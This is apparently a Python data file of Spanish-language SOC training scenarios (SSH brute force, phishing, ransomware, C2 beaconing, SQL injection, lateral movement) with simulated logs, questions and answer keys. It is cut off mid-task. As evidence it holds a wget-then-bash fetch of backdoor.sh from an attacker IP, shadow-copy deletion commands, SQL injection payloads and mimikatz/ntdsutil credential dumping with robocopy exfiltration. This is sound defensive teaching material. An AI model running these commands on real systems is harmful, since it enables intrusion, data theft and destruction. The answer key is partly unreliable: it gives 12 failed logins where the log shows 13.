"""
Contra Amenaza - Simulador de Operaciones
Escenarios realistas de SOC, Incident Response y Malware Analysis
"""

SCENARIOS = {

    # ─────────────────────────────────────────────────────────
    # SOC / INCIDENT RESPONSE
    # ─────────────────────────────────────────────────────────

    "soc-brute-force": {
        "id": "soc-brute-force",
        "title": "Ataque de Fuerza Bruta SSH",
        "category": "soc",
        "subcategory": "Autenticacion",
        "difficulty": "Principiante",
        "difficulty_color": "#10b981",
        "points": 100,
        "description": "El sistema de monitoreo ha disparado una alerta critica en el servidor SSH de produccion. Analiza los logs de autenticacion y determina que ocurrio.",
        "objectives": [
            "Identificar la IP del atacante",
            "Contar los intentos fallidos de autenticacion",
            "Determinar si el ataque fue exitoso",
            "Identificar que hizo el atacante tras el acceso"
        ],
        "evidence": {
            "Auth Log - /var/log/auth.log": """Jan 15 08:23:41 prod-srv01 sshd[4823]: Failed password for root from 203.0.113.45 port 54923 ssh2
Jan 15 08:23:43 prod-srv01 sshd[4823]: Failed password for root from 203.0.113.45 port 54924 ssh2
Jan 15 08:23:45 prod-srv01 sshd[4823]: Failed password for root from 203.0.113.45 port 54925 ssh2
Jan 15 08:23:47 prod-srv01 sshd[4823]: Failed password for admin from 203.0.113.45 port 54926 ssh2
Jan 15 08:23:49 prod-srv01 sshd[4823]: Failed password for admin from 203.0.113.45 port 54927 ssh2
Jan 15 08:24:01 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54928 ssh2
Jan 15 08:24:03 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54929 ssh2
Jan 15 08:24:05 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54930 ssh2
Jan 15 08:24:07 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54931 ssh2
Jan 15 08:24:09 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54932 ssh2
Jan 15 08:24:11 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54933 ssh2
Jan 15 08:24:13 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54934 ssh2
Jan 15 08:24:15 prod-srv01 sshd[4823]: Failed password for ubuntu from 203.0.113.45 port 54935 ssh2
Jan 15 08:24:23 prod-srv01 sshd[4823]: Accepted password for ubuntu from 203.0.113.45 port 54936 ssh2
Jan 15 08:24:23 prod-srv01 sshd[4823]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
Jan 15 08:24:35 prod-srv01 sudo[4901]: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/whoami
Jan 15 08:24:41 prod-srv01 sudo[4905]: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/backdoor.sh
Jan 15 08:24:55 prod-srv01 sudo[4910]: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash backdoor.sh""",
            "Alerta SIEM": """[ALERTA CRITICA] ID: INC-2024-0115-001
Timestamp: 2024-01-15 08:24:23 UTC
Tipo: Autenticacion Exitosa tras Multiples Fallos
Origen: 203.0.113.45 (AS: AS64496 - Unknown ISP)
Destino: prod-srv01 (10.0.1.50:22)
Usuario: ubuntu
Intentos Fallidos Previos: 12
Pais de Origen: RU (Rusia)
Reputacion IP: MALICIOSA (Listada en 3 threat feeds)"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cual es la direccion IP del atacante?",
                "type": "text",
                "correct": "203.0.113.45",
                "points": 20,
                "hint": "Busca las lineas con 'Failed password from' en el auth.log",
                "explanation": "La IP 203.0.113.45 realizo todos los intentos de autenticacion. Segun el SIEM esta IP esta listada como maliciosa en 3 threat feeds."
            },
            {
                "id": "t2",
                "question": "¿Cuantos intentos FALLIDOS de autenticacion hubo en total?",
                "type": "text",
                "correct": "12",
                "points": 20,
                "hint": "Cuenta todas las lineas con 'Failed password' en el log",
                "explanation": "Hay exactamente 12 intentos fallidos distribuidos entre los usuarios root, admin y ubuntu antes de tener exito."
            },
            {
                "id": "t3",
                "question": "¿El ataque fue exitoso? Responde 'si' o 'no'",
                "type": "text",
                "correct": "si",
                "points": 15,
                "hint": "Busca la linea 'Accepted password' en el log",
                "explanation": "Si. El atacante logro acceso con el usuario 'ubuntu' en el intento numero 13."
            },
            {
                "id": "t4",
                "question": "¿Que archivo malicioso descargo el atacante despues de ingresar?",
                "type": "text",
                "correct": "backdoor.sh",
                "points": 25,
                "hint": "Revisa las lineas de sudo con el comando wget",
                "explanation": "El atacante uso sudo para descargar backdoor.sh desde su propio servidor. Esto indica que tiene infraestructura de C2 preparada."
            },
            {
                "id": "t5",
                "question": "Segun los IOCs, ¿de que pais proviene el ataque?",
                "type": "text",
                "correct": "Rusia",
                "points": 20,
                "hint": "Revisa la alerta del SIEM al final de la evidencia",
                "explanation": "Segun el SIEM, la IP 203.0.113.45 esta geolocalizacion en Rusia (RU) y listada en 3 threat feeds como maliciosa."
            }
        ]
    },

    "soc-phishing": {
        "id": "soc-phishing",
        "title": "Analisis de Email de Phishing",
        "category": "soc",
        "subcategory": "Email Security",
        "difficulty": "Principiante",
        "difficulty_color": "#10b981",
        "points": 120,
        "description": "Un empleado del departamento de finanzas reporto un email sospechoso. El usuario hizo clic en un enlace antes de reportarlo. Analiza las cabeceras del email y determina si es phishing.",
        "objectives": [
            "Identificar el dominio real del remitente",
            "Detectar tecnicas de spoofing usadas",
            "Encontrar la URL maliciosa",
            "Clasificar el tipo de ataque"
        ],
        "evidence": {
            "Cabeceras del Email (Raw Headers)": """Return-Path: <noreply@amaz0n-security.com>
Received: from mail.amaz0n-security.com (mail.amaz0n-security.com [185.234.219.67])
        by mx.empresa.com with ESMTP id abc123
        for <finanzas@empresa.com>; Mon, 15 Jan 2024 09:15:22 +0000
From: "Amazon Security Team" <security@amazon.com>
Reply-To: noreply@amaz0n-security.com
To: finanzas@empresa.com
Subject: [URGENTE] Su cuenta Amazon ha sido comprometida - Accion Requerida
Date: Mon, 15 Jan 2024 09:15:20 +0000
Message-ID: <20240115091520.12345@amaz0n-security.com>
MIME-Version: 1.0
X-Mailer: PHPMailer 6.5.0
Authentication-Results: mx.empresa.com;
   spf=fail (sender IP is 185.234.219.67) smtp.mailfrom=amaz0n-security.com;
   dkim=none;
   dmarc=fail action=none header.from=amazon.com
Content-Type: text/html; charset=UTF-8""",
            "Cuerpo del Email": """Estimado Cliente Amazon,

Hemos detectado actividad SOSPECHOSA en su cuenta. Su acceso ha sido
temporalmente SUSPENDIDO por motivos de seguridad.

Para restaurar su acceso, debe verificar su identidad INMEDIATAMENTE:

[VERIFICAR MI CUENTA AHORA] --> hxxp://amaz0n-security.com/verify?token=xK9mP2qR&redirect=true

Si no verifica en las proximas 24 HORAS, su cuenta sera PERMANENTEMENTE eliminada.

Atentamente,
Amazon Security Team
© 2024 Amazon.com, Inc.""",
            "Reporte de Analisis de URL (Sandbox)": """URL Analizada: http://amaz0n-security.com/verify
IP del Servidor: 185.234.219.67
País del Servidor: RO (Romania)
Fecha de Registro del Dominio: 2024-01-13 (2 dias antes del ataque)
Certificado SSL: NO (HTTP sin cifrado)
Redirecciones:
  1. http://amaz0n-security.com/verify -> http://amaz0n-security.com/login.php
  2. http://amaz0n-security.com/login.php -> Pagina de login falsa de Amazon
Formulario: Solicita usuario, contrasena, numero de tarjeta de credito
VirusTotal: 8/89 vendors detectan como malicioso
Categoria: Phishing / Credential Harvesting"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cual es el dominio REAL del remitente (el que envia realmente el email)?",
                "type": "text",
                "correct": "amaz0n-security.com",
                "points": 20,
                "hint": "Mira el campo 'Return-Path' y 'Reply-To' en las cabeceras, no el campo 'From'",
                "explanation": "El dominio real es amaz0n-security.com. El atacante puso 'amazon.com' en el campo From visible para engañar, pero el Return-Path y Reply-To revelan el dominio real fraudulento."
            },
            {
                "id": "t2",
                "question": "¿Que resultado dio la verificacion SPF del email? (pass/fail/neutral)",
                "type": "text",
                "correct": "fail",
                "points": 20,
                "hint": "Busca 'spf=' en Authentication-Results",
                "explanation": "SPF=FAIL. Esto significa que el servidor que envio el email (185.234.219.67) NO esta autorizado por el dominio amazon.com para enviar emails. Confirmacion de spoofing."
            },
            {
                "id": "t3",
                "question": "¿Hace cuantos dias fue registrado el dominio malicioso antes del ataque?",
                "type": "text",
                "correct": "2",
                "points": 20,
                "hint": "Revisa el reporte de analisis de URL",
                "explanation": "El dominio fue registrado solo 2 dias antes del ataque. Esto es una tecnica comun: registrar dominios frescos para evitar listas negras."
            },
            {
                "id": "t4",
                "question": "¿Que tipo de informacion busca robar el sitio malicioso?",
                "type": "multiple_choice",
                "options": [
                    "Solo usuario y contrasena",
                    "Usuario, contrasena y numero de tarjeta de credito",
                    "Numero de telefono y direccion",
                    "Solo datos bancarios"
                ],
                "correct": 1,
                "points": 25,
                "hint": "Revisa el campo 'Formulario' en el reporte del sandbox",
                "explanation": "El sitio solicita usuario, contrasena Y numero de tarjeta de credito. Esto lo clasifica como un ataque de credential harvesting + fraude financiero."
            },
            {
                "id": "t5",
                "question": "¿Como se llama la tecnica de poner un nombre legitimo en el campo 'From' visible pero usar un dominio diferente en el envio real?",
                "type": "multiple_choice",
                "options": [
                    "Domain Hijacking",
                    "Email Spoofing",
                    "DNS Poisoning",
                    "Man-in-the-Middle"
                ],
                "correct": 1,
                "points": 35,
                "hint": "Esta tecnica falsifica la identidad del remitente en los campos visibles del email",
                "explanation": "Email Spoofing: el atacante falsifica el campo 'From' para mostrar security@amazon.com mientras el email realmente viene de amaz0n-security.com. DMARC=fail confirma esto."
            }
        ]
    },

    "soc-ransomware": {
        "id": "soc-ransomware",
        "title": "Deteccion de Ransomware",
        "category": "soc",
        "subcategory": "Malware Response",
        "difficulty": "Intermedio",
        "difficulty_color": "#f59e0b",
        "points": 200,
        "description": "Multiples usuarios reportan que sus archivos tienen una extension extrana y no pueden abrirlos. El helpdesk escalo el incidente al SOC. Analiza los logs de Windows y determina el alcance del incidente.",
        "objectives": [
            "Identificar el proceso malicioso inicial",
            "Determinar el vector de infeccion",
            "Identificar la extension de cifrado usada",
            "Determinar que sistemas estan afectados"
        ],
        "evidence": {
            "Windows Event Log - Security (Event ID 4688)": """TimeCreated: 2024-01-15 10:23:11
EventID: 4688 (Proceso Creado)
SubjectUserName: jmartinez
NewProcessName: C:\\Users\\jmartinez\\AppData\\Local\\Temp\\invoice_2024.exe
ParentProcessName: C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE
CommandLine: "C:\\Users\\jmartinez\\AppData\\Local\\Temp\\invoice_2024.exe"

TimeCreated: 2024-01-15 10:23:14
EventID: 4688
SubjectUserName: jmartinez
NewProcessName: C:\\Windows\\System32\\cmd.exe
ParentProcessName: C:\\Users\\jmartinez\\AppData\\Local\\Temp\\invoice_2024.exe
CommandLine: cmd.exe /c vssadmin delete shadows /all /quiet

TimeCreated: 2024-01-15 10:23:16
EventID: 4688
SubjectUserName: jmartinez
NewProcessName: C:\\Windows\\System32\\vssadmin.exe
ParentProcessName: C:\\Windows\\System32\\cmd.exe
CommandLine: vssadmin delete shadows /all /quiet

TimeCreated: 2024-01-15 10:23:18
EventID: 4688
SubjectUserName: jmartinez
NewProcessName: C:\\Windows\\System32\\wbem\\wmic.exe
ParentProcessName: C:\\Users\\jmartinez\\AppData\\Local\\Temp\\invoice_2024.exe
CommandLine: wmic shadowcopy delete""",
            "Sysmon Log - File Creation Events": """TimeCreated: 2024-01-15 10:24:02
EventID: 11 (FileCreate)
Image: C:\\Users\\jmartinez\\AppData\\Local\\Temp\\invoice_2024.exe
TargetFilename: C:\\Users\\jmartinez\\Documents\\presupuesto_2024.xlsx.LOCKED
MD5: a1b2c3d4e5f6789012345678901234ab

TimeCreated: 2024-01-15 10:24:03
TargetFilename: C:\\Users\\jmartinez\\Documents\\contrato_cliente.docx.LOCKED

TimeCreated: 2024-01-15 10:24:04
TargetFilename: C:\\Users\\jmartinez\\Desktop\\informe_enero.pdf.LOCKED

TimeCreated: 2024-01-15 10:24:15
TargetFilename: \\\\fileserver01\\shared\\contabilidad\\nominas_2023.xlsx.LOCKED

TimeCreated: 2024-01-15 10:24:18
TargetFilename: \\\\fileserver01\\shared\\rrhh\\contratos_empleados.zip.LOCKED""",
            "Network Log - Firewall": """2024-01-15 10:23:45 ALLOW TCP 10.0.1.105 -> 185.143.223.91:443 [invoice_2024.exe]
2024-01-15 10:23:46 ALLOW TCP 10.0.1.105 -> 185.143.223.91:443 [invoice_2024.exe]
2024-01-15 10:23:47 BLOCK TCP 10.0.1.105 -> 185.143.223.91:443 [invoice_2024.exe]
[NOTA: El firewall bloqueo la conexion DESPUES de 2 paquetes]

Hosts afectados con extensiones .LOCKED detectadas por EDR:
- WORKSTATION-105 (10.0.1.105) - Usuario: jmartinez - PACIENTE CERO
- FILESERVER01 (10.0.1.20) - Archivos compartidos comprometidos
- WORKSTATION-112 (10.0.1.112) - Usuario: aperez - Infeccion via fileserver""",
            "Nota de Rescate (README_LOCKED.txt)": """ATENCION! TUS ARCHIVOS HAN SIDO CIFRADOS

Todos tus archivos importantes han sido cifrados con AES-256.
Para recuperar tus archivos debes pagar 5.0 BTC a la siguiente direccion:
1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2

Tienes 72 horas para pagar. Despues el precio se duplicara.
Despues de pagar, contacta: locked_support@proton.me

NO intentes recuperar los archivos por tu cuenta - los dañaras permanentemente.
NO contactes a la policia - sabemos cuando lo haces."""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cual es el nombre del ejecutable malicioso (proceso inicial del ransomware)?",
                "type": "text",
                "correct": "invoice_2024.exe",
                "points": 30,
                "hint": "Busca el primer proceso creado en el Event Log 4688",
                "explanation": "invoice_2024.exe es el dropper del ransomware. Fue ejecutado desde Outlook, lo que confirma que llego como adjunto de email malicioso."
            },
            {
                "id": "t2",
                "question": "¿Cual fue el vector de infeccion inicial? (programa desde donde se ejecuto el malware)",
                "type": "text",
                "correct": "OUTLOOK.EXE",
                "points": 30,
                "hint": "Mira el campo 'ParentProcessName' del primer evento 4688",
                "explanation": "El padre del proceso malicioso es OUTLOOK.EXE. El usuario jmartinez abrio un adjunto malicioso llamado 'invoice_2024.exe' desde un email en Outlook."
            },
            {
                "id": "t3",
                "question": "¿Que extension tienen los archivos cifrados por el ransomware?",
                "type": "text",
                "correct": ".LOCKED",
                "points": 25,
                "hint": "Revisa los eventos de FileCreate en el log de Sysmon",
                "explanation": "El ransomware agrega la extension .LOCKED a todos los archivos cifrados. Esto es caracteristico de algunas familias de ransomware como LockBit."
            },
            {
                "id": "t4",
                "question": "¿Cuantos hosts (maquinas) estan afectados segun los logs?",
                "type": "text",
                "correct": "3",
                "points": 25,
                "hint": "Cuenta los hosts en el reporte de EDR en el Network Log",
                "explanation": "3 hosts afectados: WORKSTATION-105 (paciente cero), FILESERVER01 (via red compartida) y WORKSTATION-112 (que accedia al fileserver). El ransomware se propago via shares de red."
            },
            {
                "id": "t5",
                "question": "¿Que comando ejecuto el ransomware para eliminar las copias de seguridad del sistema?",
                "type": "text",
                "correct": "vssadmin delete shadows /all /quiet",
                "points": 40,
                "hint": "Busca el comando con 'vssadmin' en el Event Log 4688",
                "explanation": "vssadmin delete shadows /all /quiet elimina los Volume Shadow Copies de Windows, que son las copias de seguridad automaticas del sistema. Esta es una tecnica CLASICA del ransomware para impedir la recuperacion."
            },
            {
                "id": "t6",
                "question": "¿Cual es el nombre del usuario del paciente cero (primera maquina infectada)?",
                "type": "text",
                "correct": "jmartinez",
                "points": 50,
                "hint": "Busca 'PACIENTE CERO' en el Network Log",
                "explanation": "jmartinez es el paciente cero. Su maquina WORKSTATION-105 fue la primera infectada cuando abrio el adjunto malicioso en su correo de Outlook."
            }
        ]
    },

    "soc-c2-beacon": {
        "id": "soc-c2-beacon",
        "title": "Deteccion de Comunicacion C2",
        "category": "soc",
        "subcategory": "Network Forensics",
        "difficulty": "Intermedio",
        "difficulty_color": "#f59e0b",
        "points": 180,
        "description": "El IDS genero una alerta de trafico inusual desde una estacion de trabajo del departamento de IT. Los patrones de conexion son sospechosos. Analiza el trafico de red y determina si hay una comunicacion C2 activa.",
        "objectives": [
            "Identificar el dominio/IP del servidor C2",
            "Calcular el intervalo de beacon",
            "Identificar el protocolo de comunicacion",
            "Determinar el host comprometido"
        ],
        "evidence": {
            "Firewall Flow Log (Netflow)": """Timestamp            SrcIP         SrcPort  DstIP            DstPort  Proto  Bytes  Duration
2024-01-15 06:00:03  10.0.1.88     51234    198.51.100.73    443      TCP    1240   0.3s
2024-01-15 06:05:03  10.0.1.88     51235    198.51.100.73    443      TCP    1238   0.3s
2024-01-15 06:10:03  10.0.1.88     51236    198.51.100.73    443      TCP    1241   0.3s
2024-01-15 06:15:04  10.0.1.88     51237    198.51.100.73    443      TCP    1239   0.3s
2024-01-15 06:20:03  10.0.1.88     51238    198.51.100.73    443      TCP    1240   0.3s
2024-01-15 06:25:03  10.0.1.88     51239    198.51.100.73    443      TCP    1238   0.3s
2024-01-15 06:30:03  10.0.1.88     51240    198.51.100.73    443      TCP    1242   0.3s
2024-01-15 06:35:04  10.0.1.88     51241    198.51.100.73    443      TCP    1239   0.3s
2024-01-15 07:00:15  10.0.1.22     52100    8.8.8.8          443      TCP    58920  2.1s   [NORMAL - Google DNS]
2024-01-15 07:15:03  10.0.1.88     51242    198.51.100.73    443      TCP    2840   0.5s   [DATOS EXFILTRADOS?]
2024-01-15 07:20:03  10.0.1.88     51243    198.51.100.73    443      TCP    1238   0.3s
2024-01-15 07:25:03  10.0.1.88     51244    198.51.100.73    443      TCP    1240   0.3s""",
            "DNS Query Log": """2024-01-15 05:59:55  10.0.1.88  Query: updates.microsoft-cdn.net  -> NXDOMAIN
2024-01-15 05:59:56  10.0.1.88  Query: updates.microsoft-cdn.net  -> NXDOMAIN
2024-01-15 05:59:57  10.0.1.88  Query: updates.microsoft-cdn.net  -> 198.51.100.73
[Nota: microsoft-cdn.net NO es un dominio oficial de Microsoft]

WHOIS updates.microsoft-cdn.net:
  Registrado: 2024-01-10 (5 dias atras)
  Registrador: NameCheap
  Pais: RU
  Categoria VirusTotal: Malicious C2""",
            "Informacion del Host": """Host: WORKSTATION-088
IP: 10.0.1.88
Usuario logueado: it.admin
Departamento: IT
Ultimo login: 2024-01-15 05:45:22
Procesos con conexion a 198.51.100.73:
  PID 4821: svchost.exe (ruta: C:\\Windows\\Temp\\svchost.exe) [SOSPECHOSO]
  [Nota: El svchost.exe legitimo NUNCA se ejecuta desde Windows\\Temp]"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cual es la IP del servidor C2 al que se conecta el malware?",
                "type": "text",
                "correct": "198.51.100.73",
                "points": 25,
                "hint": "Busca la IP de destino repetida en el Firewall Flow Log",
                "explanation": "198.51.100.73 es el servidor C2. Recibe conexiones regulares y consistentes desde 10.0.1.88, con intervalos exactos entre ellas."
            },
            {
                "id": "t2",
                "question": "¿Cada cuantos minutos hace beacon el malware al servidor C2?",
                "type": "text",
                "correct": "5",
                "points": 30,
                "hint": "Calcula la diferencia entre los timestamps de las conexiones en el Netflow",
                "explanation": "El beacon ocurre exactamente cada 5 minutos (06:00, 06:05, 06:10...). Esta regularidad perfecta es imposible en trafico humano y confirma actividad automatizada de malware."
            },
            {
                "id": "t3",
                "question": "¿Que dominio usa el malware para comunicarse con el C2?",
                "type": "text",
                "correct": "updates.microsoft-cdn.net",
                "points": 25,
                "hint": "Revisa el DNS Query Log para encontrar el dominio que resuelve a la IP C2",
                "explanation": "El dominio updates.microsoft-cdn.net imita dominios legitimos de Microsoft (typosquatting). Fue registrado 5 dias antes del ataque y VirusTotal lo categoriza como C2 malicioso."
            },
            {
                "id": "t4",
                "question": "¿Que usuario esta logueado en el host comprometido?",
                "type": "text",
                "correct": "it.admin",
                "points": 30,
                "hint": "Revisa la seccion 'Informacion del Host'",
                "explanation": "El usuario it.admin tiene privilegios elevados por ser del departamento IT. Esto es critico: el atacante tiene acceso a una cuenta de administrador IT."
            },
            {
                "id": "t5",
                "question": "¿Por que el proceso svchost.exe en este host es sospechoso?",
                "type": "multiple_choice",
                "options": [
                    "Porque svchost.exe no deberia existir en Windows",
                    "Porque se ejecuta desde C:\\Windows\\Temp en lugar de C:\\Windows\\System32",
                    "Porque usa demasiada CPU",
                    "Porque tiene un nombre con mayusculas"
                ],
                "correct": 1,
                "points": 70,
                "hint": "Compara la ruta del proceso con donde deberia estar el svchost.exe legitimo",
                "explanation": "El svchost.exe LEGITIMO siempre esta en C:\\Windows\\System32. Cuando se ejecuta desde C:\\Windows\\Temp es una tecnica de Living-off-the-Land (LotL): el malware imita nombres de procesos del sistema para pasar desapercibido."
            }
        ]
    },

    "soc-sql-injection": {
        "id": "soc-sql-injection",
        "title": "Deteccion de SQL Injection",
        "category": "soc",
        "subcategory": "Web Security",
        "difficulty": "Principiante",
        "difficulty_color": "#10b981",
        "points": 130,
        "description": "El WAF (Web Application Firewall) ha generado multiples alertas en la aplicacion web de la empresa. Los logs del servidor web muestran trafico inusual. Analiza los logs y determina si hay un ataque de SQL Injection.",
        "objectives": [
            "Identificar la IP del atacante",
            "Identificar el parametro vulnerable",
            "Determinar el payload de inyeccion usado",
            "Evaluar si el ataque tuvo exito"
        ],
        "evidence": {
            "Apache Access Log": """185.220.101.45 - - [15/Jan/2024:11:30:01 +0000] "GET /login.php?user=admin&pass=test HTTP/1.1" 200 2341
185.220.101.45 - - [15/Jan/2024:11:30:15 +0000] "GET /login.php?user=admin'-- HTTP/1.1" 500 145
185.220.101.45 - - [15/Jan/2024:11:30:16 +0000] "GET /login.php?user=admin' OR '1'='1 HTTP/1.1" 200 8921
185.220.101.45 - - [15/Jan/2024:11:30:17 +0000] "GET /login.php?user=admin' OR '1'='1'-- HTTP/1.1" 200 8921
185.220.101.45 - - [15/Jan/2024:11:30:45 +0000] "GET /productos.php?id=1 UNION SELECT username,password,3,4 FROM users-- HTTP/1.1" 200 15420
185.220.101.45 - - [15/Jan/2024:11:31:02 +0000] "GET /productos.php?id=1 UNION SELECT table_name,2,3,4 FROM information_schema.tables-- HTTP/1.1" 200 42180
10.0.1.55   - - [15/Jan/2024:11:32:00 +0000] "GET /index.php HTTP/1.1" 200 5432  [trafico normal]
10.0.1.22   - - [15/Jan/2024:11:32:01 +0000] "POST /api/search HTTP/1.1" 200 1234 [trafico normal]""",
            "Alerta WAF": """[WAF ALERT] ID: WAF-2024-0389
Severidad: CRITICA
IP Origen: 185.220.101.45
Reglas Disparadas:
  - SQLI-001: SQL Comment detected (--)
  - SQLI-002: OR-based SQL Injection detected
  - SQLI-003: UNION-based SQL Injection detected
  - SQLI-004: information_schema access detected
Clasificacion IP: Tor Exit Node / Atacante conocido
Peticiones bloqueadas: 2 de 6 (WAF parcialmente bypasseado)""",
            "Error de Base de Datos (Detectado en Respuesta HTTP 500)": """MySQL Error: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL version
for the right syntax to use near ''' at line 1
Query: SELECT * FROM users WHERE username = 'admin'' AND password = 'test'
MySQL Version: 5.7.38
Database: webapp_prod"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cual es la IP del atacante?",
                "type": "text",
                "correct": "185.220.101.45",
                "points": 15,
                "hint": "Identifica la IP que hace peticiones maliciosas en el Apache Log",
                "explanation": "185.220.101.45 es un nodo de salida de Tor conocido. El atacante usa Tor para anonimizar su identidad durante el ataque."
            },
            {
                "id": "t2",
                "question": "¿Cual es el parametro URL vulnerable a SQL Injection?",
                "type": "text",
                "correct": "user",
                "points": 25,
                "hint": "Busca en que parametro el atacante inyecta codigo SQL en el login.php",
                "explanation": "El parametro 'user' en login.php es vulnerable. El codigo no sanitiza la entrada del usuario antes de incluirla en la consulta SQL."
            },
            {
                "id": "t3",
                "question": "¿Que tipo de SQL Injection uso el atacante para extraer datos de la base de datos?",
                "type": "multiple_choice",
                "options": [
                    "Blind SQL Injection",
                    "Error-based SQL Injection",
                    "UNION-based SQL Injection",
                    "Time-based SQL Injection"
                ],
                "correct": 2,
                "points": 35,
                "hint": "Mira la peticion con 'UNION SELECT' en el log de Apache",
                "explanation": "UNION-based SQL Injection: el atacante usa la clausula UNION para combinar los resultados de su consulta maliciosa con la original, extrayendo datos de la tabla 'users' e information_schema."
            },
            {
                "id": "t4",
                "question": "¿Que tabla de sistema consulto el atacante para descubrir la estructura de la BD?",
                "type": "text",
                "correct": "information_schema.tables",
                "points": 30,
                "hint": "Busca en el ultimo payload UNION SELECT del log de Apache",
                "explanation": "information_schema.tables contiene metadata de todas las tablas de la base de datos. Los atacantes siempre la consultan para mapear la estructura de la BD antes de extraer datos."
            },
            {
                "id": "t5",
                "question": "¿El WAF bloqueo TODAS las peticiones maliciosas? (si/no)",
                "type": "text",
                "correct": "no",
                "points": 25,
                "hint": "Revisa la alerta del WAF: 'Peticiones bloqueadas'",
                "explanation": "No. El WAF solo bloqueo 2 de 6 peticiones maliciosas. Esto indica que el WAF fue parcialmente bypasseado por el atacante, permitiendo extraer datos de la base de datos."
            }
        ]
    },

    "soc-lateral-movement": {
        "id": "soc-lateral-movement",
        "title": "Movimiento Lateral en Red Corporativa",
        "category": "soc",
        "subcategory": "Advanced Threats",
        "difficulty": "Avanzado",
        "difficulty_color": "#ef4444",
        "points": 300,
        "description": "El sistema EDR detecto actividad anormal en multiples hosts de la red. Un atacante parece estar moviendose lateralmente por la infraestructura. Reconstruye el camino del atacante y determina el objetivo final.",
        "objectives": [
            "Identificar el host de entrada inicial",
            "Reconstruir el camino de movimiento lateral",
            "Identificar la tecnica de movimiento lateral usada",
            "Determinar el objetivo final del atacante"
        ],
        "evidence": {
            "Windows Security Event Log (Multiples Hosts)": """-- HOST: WORKSTATION-033 (10.0.1.33) --
2024-01-15 14:22:01 EventID: 4624 (Logon exitoso) User: jgarcia  Type: Interactive  IP: -
2024-01-15 14:35:45 EventID: 4624 (Logon exitoso) User: jgarcia  Type: Network     IP: 10.0.1.33 -> 10.0.1.50
2024-01-15 14:35:46 EventID: 4688 Process: mimikatz64.exe  Parent: cmd.exe  User: jgarcia
2024-01-15 14:36:12 EventID: 4624 (Logon exitoso) User: svc_backup Type: Network   IP: 10.0.1.33 [HASH REUSE]

-- HOST: SERVER-050 (10.0.1.50 - Servidor de Archivos) --
2024-01-15 14:36:15 EventID: 4624 (Logon exitoso) User: svc_backup Type: Network   IP: 10.0.1.33
2024-01-15 14:36:20 EventID: 4688 Process: net.exe  Parent: cmd.exe  CommandLine: net group "Domain Admins" /domain
2024-01-15 14:36:25 EventID: 4688 Process: net.exe  CommandLine: net user /domain
2024-01-15 14:36:30 EventID: 4688 Process: nltest.exe CommandLine: nltest /dclist:empresa.local

-- HOST: DC01 (10.0.1.10 - Controlador de Dominio) --
2024-01-15 14:40:01 EventID: 4624 (Logon exitoso) User: svc_backup Type: Network   IP: 10.0.1.50
2024-01-15 14:40:15 EventID: 4688 Process: ntdsutil.exe CommandLine: ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ntds" q q
2024-01-15 14:41:02 EventID: 4688 Process: robocopy.exe CommandLine: robocopy c:\\temp\\ntds \\\\10.0.1.33\\c$\\users\\jgarcia\\appdata\\local\\temp\\backup""",
            "EDR Telemetry": """ALERTA CRITICA - Credential Dumping detectado
Host: WORKSTATION-033
Proceso: mimikatz64.exe
Hash SHA256: a3f5c8d2...
Accion: Dumping de credenciales LSASS
Credenciales obtenidas: svc_backup (NTLM Hash: aad3b435b51404ee...)

ALERTA - NTDS.dit access detected
Host: DC01
Proceso: ntdsutil.exe
Accion: Extraccion de base de datos de Active Directory completa
Impacto: TODOS los hashes de contrasenas del dominio comprometidos""",
            "Resumen de la Red": """Arquitectura de Red:
10.0.1.0/24 - Red Corporativa
  10.0.1.10  - DC01 (Controlador de Dominio) [OBJETIVO DE ALTO VALOR]
  10.0.1.20  - DC02 (Controlador de Dominio secundario)
  10.0.1.33  - WORKSTATION-033 [PUNTO DE ENTRADA]
  10.0.1.50  - SERVER-050 (Servidor de Archivos)
  10.0.1.88  - WORKSTATION-088 (IT Admin)
  10.0.1.105 - WORKSTATION-105

Cuenta svc_backup: Cuenta de servicio con privilegios elevados
Ultimo cambio de contrasena: 847 dias (sin rotacion)"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cual es el host de entrada inicial (paciente cero)?",
                "type": "text",
                "correct": "WORKSTATION-033",
                "points": 40,
                "hint": "Busca el primer host donde jgarcia inicio sesion de forma interactiva (Type: Interactive)",
                "explanation": "WORKSTATION-033 es el punto de entrada. El usuario jgarcia inicio sesion interactiva ahi, y desde ese host comenzo todo el movimiento lateral."
            },
            {
                "id": "t2",
                "question": "¿Que herramienta uso el atacante para robar credenciales del host inicial?",
                "type": "text",
                "correct": "mimikatz64.exe",
                "points": 50,
                "hint": "Busca el proceso sospechoso ejecutado en WORKSTATION-033 despues de que jgarcia inicio sesion",
                "explanation": "Mimikatz es la herramienta de credential dumping mas conocida. Extrae hashes NTLM y credenciales en texto claro de la memoria del proceso LSASS de Windows."
            },
            {
                "id": "t3",
                "question": "¿Cual es la tecnica de movimiento lateral usada para acceder a SERVER-050 y DC01?",
                "type": "multiple_choice",
                "options": [
                    "Pass-the-Ticket (Kerberos)",
                    "Pass-the-Hash (NTLM)",
                    "Remote Desktop Protocol (RDP)",
                    "SSH Tunneling"
                ],
                "correct": 1,
                "points": 60,
                "hint": "El log dice '[HASH REUSE]' al conectarse con svc_backup. Mimikatz robo el NTLM hash de esa cuenta.",
